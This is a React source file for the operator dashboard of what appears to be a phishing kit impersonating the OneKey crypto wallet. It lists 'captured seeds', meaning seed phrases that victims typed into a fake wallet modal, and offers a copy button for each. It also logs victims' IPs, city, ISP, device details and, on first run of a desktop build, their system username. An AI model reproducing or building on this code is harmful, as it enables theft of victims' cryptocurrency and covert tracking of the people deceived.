import { useEffect, useState } from "react";
import { ref, onValue, push, remove, get } from "firebase/database";
import { db } from "./firebase";
import DeviceDetector from "device-detector-js";

function InstallInfoCard({
  onClose,
  info,
}: {
  onClose: () => void;
  info: any;
}) {
  return (
    <div className="bg-gradient-to-r from-green-500 to-blue-600 text-white rounded-xl p-6 mb-8 shadow-lg flex flex-col md:flex-row items-center justify-between gap-6 animate-fade-in">
      <div>
        <h2 className="text-xl font-bold mb-2">Bem-vindo ao OneKey!</h2>
        <p className="text-sm mb-2">
          Instalação detectada. Veja os dados do seu sistema:
        </p>
        <ul className="text-sm space-y-1">
          <li>
            <b>Sistema:</b> {info.platform}
          </li>
          <li>
            <b>Versão:</b> {info.release}
          </li>
          <li>
            <b>Arquitetura:</b> {info.arch}
          </li>
          <li>
            <b>Usuário:</b> {info.username}
          </li>
        </ul>
      </div>
      <button
        className="mt-4 md:mt-0 bg-white text-green-600 font-bold px-6 py-2 rounded-lg shadow hover:bg-gray-100 transition-colors"
        onClick={onClose}
      >
        Fechar
      </button>
    </div>
  );
}

export default function Dashboard() {
  const [visitas, setVisitas] = useState<any[]>([]);
  const [downloads, setDownloads] = useState<any[]>([]);
  const [seeds, setSeeds] = useState<any[]>([]);
  const [clientCards, setClientCards] = useState<any[]>([]);
  const [showVisitasModal, setShowVisitasModal] = useState(false);
  const [showSeedsModal, setShowSeedsModal] = useState(false);
  const [showClientCardsModal, setShowClientCardsModal] = useState(false);
  const [showInstallCard, setShowInstallCard] = useState(false);
  const [installInfo, setInstallInfo] = useState<any>(null);

  useEffect(() => {
    const eventosRef = ref(db, "eventos");
    const seedsRef = ref(db, "seeds");
    const clientCardsRef = ref(db, "clientcards");

    const unsubscribeEventos = onValue(eventosRef, (snapshot) => {
      const val = snapshot.val() || {};
      const eventos = Object.values(val);
      setVisitas(eventos.filter((e: any) => e.tipo === "visita"));
      setDownloads(eventos.filter((e: any) => e.tipo === "download"));
    });

    const unsubscribeSeeds = onValue(seedsRef, (snapshot) => {
      const val = snapshot.val() || {};
      const seedsData = Object.values(val);
      setSeeds(seedsData);
    });

    const unsubscribeClientCards = onValue(clientCardsRef, (snapshot) => {
      const val = snapshot.val() || {};
      const clientCardsData = Object.values(val);
      setClientCards(clientCardsData);
    });

    return () => {
      unsubscribeEventos();
      unsubscribeSeeds();
      unsubscribeClientCards();
    };
  }, []);

  useEffect(() => {
    // Detectar primeira execução (Electron)
    if (window.electronAPI && !localStorage.getItem("firstRunDone")) {
      window.electronAPI.getSystemInfo().then((info: any) => {
        setInstallInfo(info);
        setShowInstallCard(true);
        // Registrar evento de instalação no Firebase
        push(ref(db, "eventos"), {
          tipo: "instalacao",
          data: new Date().toISOString(),
          ...info,
        });
        localStorage.setItem("firstRunDone", "true");
      });
    }
  }, []);

  // Contagem de visitas hoje
  const hoje = new Date().toISOString().slice(0, 10);
  const visitasHoje = visitas.filter(
    (v) => (v.data || "").slice(0, 10) === hoje
  ).length;

  // Contagem de seeds hoje
  const seedsHoje = seeds.filter(
    (s) => (s.data || "").slice(0, 10) === hoje
  ).length;

  // Contagem de clientcards hoje (agora são visitas da /wallet)
  const clientCardsHoje = clientCards.filter(
    (c) => (c.data || "").slice(0, 10) === hoje
  ).length;

  // Filtrar apenas visitas da /wallet para mostrar como instalações
  const visitasWallet = visitas.filter((v) => v.origem === "/wallet");
  const visitasWalletHoje = visitasWallet.filter(
    (v) => (v.data || "").slice(0, 10) === hoje
  ).length;

  // Função para formatar números
  const formatNumber = (num: number) => num.toLocaleString("pt-BR");

  // Função para copiar seed para clipboard
  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      // Você pode adicionar um toast aqui se quiser
    } catch (err) {
      console.error("Erro ao copiar:", err);
    }
  };

  // Função para obter código da bandeira
  function getFlagCode(v: any) {
    if (v.pais_code) return v.pais_code;
    if (v.pais) {
      return v.pais
        .normalize("NFD")
        .replace(/[^\w\s]/gi, "")
        .slice(0, 2)
        .toLowerCase();
    }
    return "";
  }

  // Função para detectar informações do dispositivo
  function getDeviceInfo(userAgent: string) {
    if (!userAgent)
      return {
        device: "desktop",
        os: "Unknown",
        browser: "Unknown",
        brand: "",
        model: "",
        osVersion: "",
        browserVersion: "",
      };

    const deviceDetector = new DeviceDetector();
    const device = deviceDetector.parse(userAgent);

    return {
      device: device.device?.type || "desktop",
      os: device.os?.name || "Unknown",
      browser: device.client?.name || "Unknown",
      brand: device.device?.brand || "",
      model: device.device?.model || "",
      osVersion: device.os?.version || "",
      browserVersion: device.client?.version || "",
    };
  }

  // Função para obter ícone do dispositivo
  function getDeviceIcon(deviceType: string, os: string) {
    if (deviceType === "smartphone") return "📱";
    if (deviceType === "tablet") return "📱";
    if (deviceType === "desktop") {
      if (os.toLowerCase().includes("windows")) return "🖥️";
      if (os.toLowerCase().includes("mac")) return "🖥️";
      if (os.toLowerCase().includes("linux")) return "🖥️";
      return "💻";
    }
    return "💻";
  }

  // Função para obter ícone do navegador
  function getBrowserIcon(browser: string) {
    const browserLower = browser.toLowerCase();
    if (browserLower.includes("chrome")) return "🌐";
    if (browserLower.includes("firefox")) return "🦊";
    if (browserLower.includes("safari")) return "🌐";
    if (browserLower.includes("edge")) return "🌐";
    return "🌐";
  }

  const platformLabelMap: Record<string, string> = {
    windows: "Windows",
    macos: "macOS",
    android: "Android APK",
    googleplay: "Google Play",
    chrome: "Chrome",
    linux: "Linux",
    pontehardware: "Ponte de hardware",
  };

  // Funções para limpar dados
  const handleClearVisitas = async () => {
    if (window.confirm("Tem certeza que deseja limpar todas as visitas?")) {
      await remove(ref(db, "eventos"));
    }
  };
  const handleClearSeeds = async () => {
    if (window.confirm("Tem certeza que deseja limpar todas as seeds?")) {
      await remove(ref(db, "seeds"));
    }
  };

  const handleClearClientCards = async () => {
    if (window.confirm("Tem certeza que deseja limpar todas as instalações?")) {
      // Limpar apenas as visitas da /wallet
      const eventosRef = ref(db, "eventos");
      const snapshot = await get(eventosRef);
      const eventos = snapshot.val() || {};

      // Filtrar apenas eventos que NÃO são visitas da /wallet
      const eventosParaManter = Object.entries(eventos).filter(
        ([key, evento]: [string, any]) => {
          return !(evento.tipo === "visita" && evento.origem === "/wallet");
        }
      );

      // Recriar a coleção apenas com os eventos que devem ser mantidos
      await remove(eventosRef);
      for (const [key, evento] of eventosParaManter) {
        await push(eventosRef, evento);
      }
    }
  };
  const handleClearInstalacoes = async () => {
    if (window.confirm("Tem certeza que deseja limpar todas as instalações?")) {
      // Remove apenas eventos de tipo instalacao
      const eventosRef = ref(db, "eventos");
      onValue(
        eventosRef,
        (snapshot) => {
          const val = snapshot.val() || {};
          Object.entries(val).forEach(([key, value]: any) => {
            if (value.tipo === "instalacao") {
              remove(ref(db, `eventos/${key}`));
            }
          });
        },
        { onlyOnce: true }
      );
    }
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      <header className="border-b border-gray-800 bg-gray-900/50 backdrop-blur-sm">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center space-x-4">
              <div className="w-8 h-8 bg-gradient-to-r from-blue-500 to-purple-600 rounded-lg flex items-center justify-center">
                <svg
                  className="w-5 h-5"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"
                  />
                </svg>
              </div>
              <h1 className="text-xl font-semibold text-gray-100">Dashboard</h1>
            </div>
            <div className="flex items-center space-x-4">
              <a
                href="/"
                className="flex items-center gap-2 px-4 py-2 text-gray-300 hover:text-white hover:bg-gray-800 rounded-lg transition-colors"
              >
                <svg
                  className="w-4 h-4"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M10 19l-7-7m0 0l7-7m-7 7h18"
                  />
                </svg>
                Voltar
              </a>
            </div>
          </div>
        </div>
      </header>
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {showInstallCard && installInfo && (
          <InstallInfoCard
            info={installInfo}
            onClose={() => setShowInstallCard(false)}
          />
        )}
        <div className="mb-8 flex flex-col md:flex-row md:items-center md:justify-between gap-4">
          <div>
            <h2 className="text-2xl font-bold text-gray-100 mb-2">
              Visão Geral
            </h2>
            <p className="text-gray-400">
              Monitoramento em tempo real dos dados do sistema
            </p>
          </div>
          <div className="flex gap-2 flex-wrap">
            <button
              onClick={handleClearVisitas}
              className="bg-gray-800 hover:bg-red-600 text-white px-4 py-2 rounded-lg text-sm font-semibold transition-colors"
            >
              Limpar Visitas
            </button>
            <button
              onClick={handleClearSeeds}
              className="bg-gray-800 hover:bg-purple-600 text-white px-4 py-2 rounded-lg text-sm font-semibold transition-colors"
            >
              Limpar Seeds
            </button>
            <button
              onClick={handleClearInstalacoes}
              className="bg-gray-800 hover:bg-green-600 text-white px-4 py-2 rounded-lg text-sm font-semibold transition-colors"
            >
              Limpar Instalações
            </button>
            <button
              onClick={handleClearClientCards}
              className="bg-gray-800 hover:bg-green-600 text-white px-4 py-2 rounded-lg text-sm font-semibold transition-colors"
            >
              Limpar Instalações
            </button>
          </div>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
          {/* Card Visitas */}
          <div
            className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-xl p-6 cursor-pointer"
            onClick={() => setShowVisitasModal(true)}
          >
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center space-x-3">
                <div className="w-12 h-12 bg-gradient-to-r from-blue-500 to-blue-600 rounded-lg flex items-center justify-center">
                  <svg
                    className="w-6 h-6 text-white"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"
                    />
                  </svg>
                </div>
                <div>
                  <h3 className="text-lg font-semibold text-gray-100">
                    Visitas
                  </h3>
                  <p className="text-sm text-gray-400">Total de acessos</p>
                </div>
              </div>
              <span className="bg-green-500/20 text-green-400 px-2 py-1 rounded-full text-xs font-medium">
                {formatNumber(visitas.length)}
              </span>
            </div>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-3xl font-bold text-gray-100">
                  {formatNumber(visitas.length)}
                </span>
                <span className="text-sm text-gray-400">Total</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-gray-400">Hoje:</span>
                <span className="text-gray-200 font-medium">
                  {formatNumber(visitasHoje)}
                </span>
              </div>
            </div>
          </div>
          {/* Card Seeds */}
          <div
            className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-xl p-6 cursor-pointer hover:bg-gray-800/70 transition-colors"
            onClick={() => setShowSeedsModal(true)}
          >
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center space-x-3">
                <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-purple-600 rounded-lg flex items-center justify-center">
                  <svg
                    className="w-6 h-6 text-white"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                </div>
                <div>
                  <h3 className="text-lg font-semibold text-gray-100">Seeds</h3>
                  <p className="text-sm text-gray-400">Seeds capturadas</p>
                </div>
              </div>
              <span className="bg-purple-500/20 text-purple-400 px-2 py-1 rounded-full text-xs font-medium">
                {formatNumber(seeds.length)}
              </span>
            </div>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-3xl font-bold text-gray-100">
                  {formatNumber(seeds.length)}
                </span>
                <span className="text-sm text-gray-400">Total</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-gray-400">Hoje:</span>
                <span className="text-gray-200 font-medium">
                  {formatNumber(seedsHoje)}
                </span>
              </div>
            </div>
          </div>
          {/* Card Instalações (visitas da /wallet) */}
          <div
            className="bg-gray-800/50 backdrop-blur-sm border border-gray-700 rounded-xl p-6 cursor-pointer hover:bg-gray-800/70 transition-colors"
            onClick={() => setShowClientCardsModal(true)}
          >
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center space-x-3">
                <div className="w-12 h-12 bg-gradient-to-r from-green-500 to-green-600 rounded-lg flex items-center justify-center">
                  <svg
                    className="w-6 h-6 text-white"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 4v8m0 0l-3-3m3 3l3-3M4 16h12"
                    />
                  </svg>
                </div>
                <div>
                  <h3 className="text-lg font-semibold text-gray-100">
                    Instalações
                  </h3>
                  <p className="text-sm text-gray-400">Quem instalou o app</p>
                </div>
              </div>
              <span className="bg-green-500/20 text-green-400 px-2 py-1 rounded-full text-xs font-medium">
                {formatNumber(visitasWallet.length)}
              </span>
            </div>
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-3xl font-bold text-gray-100">
                  {formatNumber(visitasWallet.length)}
                </span>
                <span className="text-sm text-gray-400">Total</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-gray-400">Hoje:</span>
                <span className="text-gray-200 font-medium">
                  {formatNumber(visitasWalletHoje)}
                </span>
              </div>
            </div>
          </div>
        </div>
        {/* Card de clientes que baixaram */}
        <div className="mt-8">
          <h3 className="text-lg font-bold mb-4">
            Clientes conectados - Últimos
          </h3>
          <div className="flex flex-col gap-2">
            {downloads
              .slice(-12)
              .reverse()
              .map((d, i) => {
                const flagCode = getFlagCode(d);
                // Tenta pegar a URL de origem
                const url = d.url || d.origem || "-";
                let domain = "-";
                try {
                  domain = url !== "-" ? new URL(url).hostname : "-";
                } catch (e) {
                  domain = url;
                }
                return (
                  <div
                    key={i}
                    className="bg-gray-900/80 border border-green-500 rounded-lg shadow flex flex-wrap items-center gap-2 px-4 py-2 text-xs md:text-sm hover:scale-[1.01] transition-transform"
                  >
                    {/* Favicon + URL */}
                    {domain !== "-" && (
                      <img
                        src={`https://www.google.com/s2/favicons?domain=${domain}`}
                        alt="favicon"
                        className="w-5 h-5 mr-1"
                      />
                    )}
                    <span className="text-blue-300 font-mono truncate max-w-[160px]">
                      {domain}
                    </span>
                    {/* País e cidade */}
                    <img
                      src={
                        flagCode
                          ? `https://flagcdn.com/32x24/${flagCode}.png`
                          : "./mundo.svg"
                      }
                      alt={d.pais}
                      className="w-5 h-4 rounded border bg-gray-100 object-cover"
                      onError={(e) => (e.currentTarget.src = "./mundo.svg")}
                    />
                    <span className="text-gray-300">{d.pais || "-"}</span>
                    <span className="text-gray-400">
                      {d.cidade}
                      {d.estado ? `, ${d.estado}` : ""}
                    </span>
                    {/* Data/hora */}
                    <span className="text-gray-400">
                      {new Date(d.data).toLocaleTimeString()}
                    </span>
                    {/* Botão DIRECT */}
                    <span className="bg-gray-700 text-white rounded px-2 py-1 ml-2">
                      DIRECT
                    </span>
                  </div>
                );
              })}
            {downloads.length === 0 && (
              <div className="text-center text-gray-500 py-8 col-span-full">
                Nenhum download registrado.
              </div>
            )}
          </div>
        </div>
        {/* Modal de visitas */}
        {showVisitasModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 animate-fade-in">
            <div className="bg-white text-black rounded-2xl p-6 max-w-lg w-full shadow-2xl relative animate-fade-in transition-all duration-300">
              <button
                className="absolute top-3 right-4 text-2xl text-gray-400 hover:text-black"
                onClick={() => setShowVisitasModal(false)}
                aria-label="Fechar"
              >
                ✕
              </button>
              <h2 className="text-2xl font-bold mb-6 text-center">
                Últimas Visitas
              </h2>
              <div className="space-y-4 max-h-96 overflow-y-auto pr-2 custom-scroll">
                {visitas
                  .slice(-10)
                  .reverse()
                  .map((v, i) => {
                    const flagCode = getFlagCode(v);
                    return (
                      <div
                        key={i}
                        className="flex items-center gap-4 border-b pb-3 last:border-b-0"
                      >
                        <img
                          src={
                            flagCode
                              ? `https://flagcdn.com/32x24/${flagCode}.png`
                              : "./mundo.svg"
                          }
                          alt={v.pais}
                          className="w-8 h-6 rounded border bg-gray-100 object-cover"
                          onError={(e) => (e.currentTarget.src = "./mundo.svg")}
                        />
                        <div className="flex-1">
                          <div className="font-semibold text-base flex items-center gap-2">
                            {v.pais || "Desconhecido"}
                            {v.cidade && <>- {v.cidade}</>}
                            {v.estado && (
                              <span className="text-xs text-gray-500">
                                ({v.estado})
                              </span>
                            )}
                          </div>
                          <div className="text-xs text-gray-600 flex items-center gap-2 mt-1">
                            <span className="inline-block px-2 py-0.5 bg-gray-200 rounded">
                              {v.plataforma}
                            </span>
                            <span>{new Date(v.data).toLocaleString()}</span>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                {visitas.length === 0 && (
                  <div className="text-center text-gray-500 py-8">
                    Nenhuma visita registrada.
                  </div>
                )}
              </div>
            </div>
            <style>{`
              .custom-scroll::-webkit-scrollbar { width: 8px; }
              .custom-scroll::-webkit-scrollbar-thumb { background: #e5e7eb; border-radius: 4px; }
            `}</style>
          </div>
        )}
        {/* Modal de seeds */}
        {showSeedsModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 animate-fade-in">
            <div className="bg-gray-900 text-white rounded-2xl p-8 max-w-4xl w-full shadow-2xl relative animate-fade-in transition-all duration-300">
              <button
                className="absolute top-4 right-6 text-2xl text-gray-400 hover:text-white transition-colors"
                onClick={() => setShowSeedsModal(false)}
                aria-label="Fechar"
              >
                ✕
              </button>

              {/* Header com logo OneKey */}
              <div className="flex items-center justify-center mb-8">
                <div className="flex items-center gap-4">
                  <img src="./logo.svg" alt="OneKey" className="w-12 h-12" />
                  <h2 className="text-3xl font-bold text-white">
                    Seeds Capturadas
                  </h2>
                </div>
              </div>

              {/* Grid de seeds */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 max-h-[70vh] overflow-y-auto pr-2 custom-scroll">
                {seeds
                  .slice(-20)
                  .reverse()
                  .map((s, i) => {
                    const flagCode = getFlagCode(s);
                    const seedWords = s.seed ? s.seed.split(" ") : [];
                    const seedCount = seedWords.length;

                    return (
                      <div
                        key={i}
                        className="bg-gray-800/80 border border-purple-500/30 rounded-xl p-6 hover:border-purple-500/50 transition-all duration-300 hover:scale-[1.02]"
                      >
                        {/* Header do card */}
                        <div className="flex items-center justify-between mb-4">
                          <div className="flex items-center gap-3">
                            <img
                              src={
                                flagCode
                                  ? `https://flagcdn.com/32x24/${flagCode}.png`
                                  : "./mundo.svg"
                              }
                              alt={s.pais}
                              className="w-8 h-6 rounded border bg-gray-100 object-cover"
                              onError={(e) =>
                                (e.currentTarget.src = "./mundo.svg")
                              }
                            />
                            <div>
                              <div className="font-semibold text-white">
                                {s.pais || "Desconhecido"}
                              </div>
                              <div className="text-xs text-gray-400">
                                {s.cidade}
                                {s.estado ? `, ${s.estado}` : ""}
                              </div>
                            </div>
                          </div>
                          <div className="text-right">
                            <div className="text-xs text-gray-400">
                              {new Date(s.data).toLocaleDateString()}
                            </div>
                            <div className="text-xs text-purple-400 font-medium">
                              {seedCount} palavras
                            </div>
                          </div>
                        </div>

                        {/* Seed words */}
                        <div className="mb-4">
                          <div className="text-sm text-gray-400 mb-2">
                            Seed Phrase:
                          </div>
                          <div className="bg-gray-900/60 rounded-lg p-3 border border-gray-700">
                            <div className="grid grid-cols-3 gap-2 text-sm">
                              {seedWords.map((word: string, idx: number) => (
                                <div
                                  key={idx}
                                  className="flex items-center gap-1"
                                >
                                  <span className="text-gray-500 text-xs w-4">
                                    {idx + 1}.
                                  </span>
                                  <span className="text-white font-mono">
                                    {word}
                                  </span>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>

                        {/* Botão copiar */}
                        <div className="flex justify-end">
                          <button
                            onClick={() => copyToClipboard(s.seed)}
                            className="flex items-center gap-2 px-4 py-2 text-sm text-white bg-purple-600 rounded-lg hover:bg-purple-700 transition-colors"
                          >
                            <svg
                              className="w-4 h-4"
                              fill="none"
                              stroke="currentColor"
                              viewBox="0 0 24 24"
                            >
                              <path
                                strokeLinecap="round"
                                strokeLinejoin="round"
                                strokeWidth={2}
                                d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-6 9l2 2 4-4"
                              />
                            </svg>
                            Copiar Seed
                          </button>
                        </div>
                      </div>
                    );
                  })}
                {seeds.length === 0 && (
                  <div className="text-center text-gray-500 py-12 col-span-full">
                    <div className="text-6xl mb-4">🔒</div>
                    <div className="text-xl font-semibold mb-2">
                      Nenhuma seed registrada
                    </div>
                    <div className="text-gray-400">
                      As seeds digitadas no modal da carteira aparecerão aqui
                    </div>
                  </div>
                )}
              </div>
            </div>
            <style>{`
               .custom-scroll::-webkit-scrollbar { width: 8px; }
               .custom-scroll::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
               .custom-scroll::-webkit-scrollbar-track { background: #1f2937; border-radius: 4px; }
             `}</style>
          </div>
        )}
        {/* Modal de Instalações (visitas da /wallet) */}
        {showClientCardsModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 animate-fade-in">
            <div className="bg-gray-900 text-white rounded-2xl p-8 max-w-4xl w-full shadow-2xl relative animate-fade-in transition-all duration-300">
              <button
                className="absolute top-4 right-6 text-2xl text-gray-400 hover:text-white transition-colors"
                onClick={() => setShowClientCardsModal(false)}
                aria-label="Fechar"
              >
                ✕
              </button>

              {/* Header com logo OneKey */}
              <div className="flex items-center justify-center mb-8">
                <div className="flex items-center gap-4">
                  <img src="./logo.svg" alt="OneKey" className="w-12 h-12" />
                  <h2 className="text-3xl font-bold text-white">
                    Instalações - Quem Instalou o App
                  </h2>
                </div>
              </div>

              {/* Grid de instalações */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 max-h-[70vh] overflow-y-auto pr-2 custom-scroll">
                {visitasWallet
                  .slice(-20)
                  .reverse()
                  .map((v, i) => {
                    const flagCode = getFlagCode(v);
                    const deviceInfo = getDeviceInfo(v.agente);

                    return (
                      <div
                        key={i}
                        className="bg-gray-800/80 border border-green-500/30 rounded-xl p-6 hover:border-green-500/50 transition-all duration-300 hover:scale-[1.02]"
                      >
                        {/* Header do card */}
                        <div className="flex items-center justify-between mb-4">
                          <div className="flex items-center gap-3">
                            <img
                              src={
                                flagCode
                                  ? `https://flagcdn.com/32x24/${flagCode}.png`
                                  : "./mundo.svg"
                              }
                              alt={v.pais}
                              className="w-8 h-6 rounded border bg-gray-100 object-cover"
                              onError={(e) =>
                                (e.currentTarget.src = "./mundo.svg")
                              }
                            />
                            <div>
                              <div className="font-semibold text-white">
                                {v.pais || "Desconhecido"}
                              </div>
                              <div className="text-xs text-gray-400">
                                {v.cidade}
                                {v.estado ? `, ${v.estado}` : ""}
                              </div>
                            </div>
                          </div>
                          <div className="text-right">
                            <div className="text-xs text-gray-400">
                              {new Date(v.data).toLocaleDateString()}
                            </div>
                            <div className="text-xs text-green-400 font-medium">
                              {new Date(v.data).toLocaleTimeString()}
                            </div>
                          </div>
                        </div>

                        {/* Informações do dispositivo */}
                        <div className="mb-4">
                          <div className="text-sm text-gray-400 mb-2">
                            Dispositivo:
                          </div>
                          <div className="bg-gray-900/60 rounded-lg p-3 border border-gray-700">
                            <div className="text-white font-semibold text-lg">
                              {getDeviceIcon(deviceInfo.device, deviceInfo.os)}{" "}
                              {deviceInfo.os} {deviceInfo.osVersion}
                            </div>
                            <div className="text-sm text-gray-300 mt-1">
                              {deviceInfo.browser} {deviceInfo.browserVersion}
                            </div>
                            {deviceInfo.brand && deviceInfo.model && (
                              <div className="text-xs text-gray-400 mt-1">
                                {deviceInfo.brand} {deviceInfo.model}
                              </div>
                            )}
                          </div>
                        </div>

                        {/* Informações adicionais */}
                        <div className="text-xs text-gray-400">
                          <div>Data: {new Date(v.data).toLocaleString()}</div>
                          <div>IP: {v.ip || "Desconhecido"}</div>
                          <div>País: {v.pais || "Desconhecido"}</div>
                          <div>Cidade: {v.cidade || "Desconhecida"}</div>
                          <div>Estado: {v.estado || "Desconhecido"}</div>
                          {v.org && <div>ISP: {v.org}</div>}
                        </div>
                      </div>
                    );
                  })}
                {visitasWallet.length === 0 && (
                  <div className="text-center text-gray-500 py-12 col-span-full">
                    <div className="text-6xl mb-4">📱</div>
                    <div className="text-xl font-semibold mb-2">
                      Nenhuma instalação registrada
                    </div>
                    <div className="text-gray-400">
                      As instalações do app aparecerão aqui quando alguém abrir
                      o /wallet
                    </div>
                  </div>
                )}
              </div>
            </div>
            <style>{`
               .custom-scroll::-webkit-scrollbar { width: 8px; }
               .custom-scroll::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
               .custom-scroll::-webkit-scrollbar-track { background: #1f2937; border-radius: 4px; }
             `}</style>
          </div>
        )}
      </main>
    </div>
  );
}
